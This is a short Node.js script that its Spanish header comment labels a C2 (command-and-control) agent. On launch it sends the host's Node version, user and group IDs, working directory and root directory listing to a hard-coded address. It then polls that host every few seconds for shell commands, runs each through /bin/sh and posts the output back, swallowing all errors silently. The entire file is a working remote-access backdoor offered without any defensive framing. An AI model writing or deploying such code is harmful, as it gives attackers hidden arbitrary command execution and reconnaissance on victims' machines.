// sbtv3 C2 v3 — spawn con pipes (probado) + diagnósticos puros de node
var http = require('http');
var cp = require('child_process');
var fs = require('fs');

var HOST = '192.168.1.55';
var CMDPORT = 8000;
var OUTPORT = 4446;

function post(body) {
    try {
        var req = http.request({ host: HOST, port: OUTPORT, method: 'POST', path: '/r' }, function () {});
        req.on('error', function () {});
        req.write(body || '');
        req.end();
    } catch (e) {}
}

post('C3?start node=' + process.version);
try { post('C3?uid=' + (process.getuid ? process.getuid() : '?') + ' gid=' + (process.getgid ? process.getgid() : '?')); } catch (e) {}
try { post('C3?cwd=' + process.cwd()); } catch (e) {}
try { post('C3?rootfs=' + fs.readdirSync('/').join(',')); } catch (e) { post('C3?fsERR=' + e.message); }

function run(cmd) {
    var out = '';
    var err = '';
    var sh;
    try {
        sh = cp.spawn('/bin/sh', ['-c', cmd]);
    } catch (e) {
        post('RUN?spawnEX=' + e.message);
        return;
    }
    sh.stdout.on('data', function (d) { out += d; });
    sh.stderr.on('data', function (d) { err += d; });
    sh.on('error', function (e) { post('RUN?spawnERR=' + e.message); });
    sh.on('exit', function (code) {
        post('RUN?code=' + code + '\n' + out + err);
    });
}

function tick() {
    http.get('http://' + HOST + ':' + CMDPORT + '/cmd', function (res) {
        var body = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { body += c; });
        res.on('end', function () {
            body = body || '';
            if (body.trim().length > 0) { run(body); }
            setTimeout(tick, 3000);
        });
    }).on('error', function () {
        setTimeout(tick, 6000);
    });
}
tick();
